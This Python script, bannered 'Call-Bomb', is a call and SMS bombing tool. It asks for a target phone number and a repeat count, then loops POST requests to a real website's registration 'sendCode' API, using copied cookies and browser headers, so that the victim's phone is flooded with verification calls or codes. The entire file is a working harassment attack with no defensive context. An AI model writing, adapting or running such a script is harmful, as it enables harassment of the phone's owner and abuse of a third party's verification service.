import requests
import sys
import time
import os
import re
import datetime


red='\033[1;91m'
white='\033[1;97m'
green='\033[1;32m' 
yellow='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;35m'
def sprint(s):
	for c in s+"\n":
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(20/6000)
		

sprint(red+"=================================================================")
sprint(red+"=================================================================")

sprint(green+"""
   ___ _____      _ _        ____                  _   ___ 
  |  _/ ____|    | | |      |  _ \                | | |_  |
  | || |     __ _| | |______| |_) | ___  _ __ ___ | |__ | |
  | || |    / _` | | |______|  _ < / _ \| '_ ` _ \| '_ \| |
  | || |___| (_| | | |      | |_) | (_) | | | | | | |_) | |
  | |_\_____\__,_|_|_|      |____/ \___/|_| |_| |_|_.__/| |
  |___|                                               |___| """)
  
sprint(red+"=================================================================")
sprint(red+"=================================================================")

num=str(input(green+"\n[ENTER-YOUR-NUMBER] = "))
amu=int(input(yellow+"\n[ENTER-AN-AMMOUNT] = "))
time.sleep(8)
os.system("clear")



cookies = {
    'MEIQIA_TRACK_ID': '2QiiXVQndxKXyiBqADttDUhScCL',
    'MEIQIA_VISIT_ID': '2QiiXZIgRCEtRYTT4rbYOff2t8W',
    'Register_Code_Countdown_Time': '60000',
}

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'bn',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://spg.world',
    'Referer': 'https://spg.world/m/register?codeNumber=090910',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; i80) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'X-USER-TOKEN': 'undefined',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

json_data = {
    'isEmail': False,
    'phone': num,
    'sendType': 'REGISTER_CODE',
}

for x in range(amu):
	xx=str([x+1])
	
	login = requests.post('https://spg.world/api/common/sendCode', cookies=cookies, headers=headers, json=json_data).text
	if "0" in login:
		print(green+"[CALL]-[SEND]-"+xx+"-[✓]")

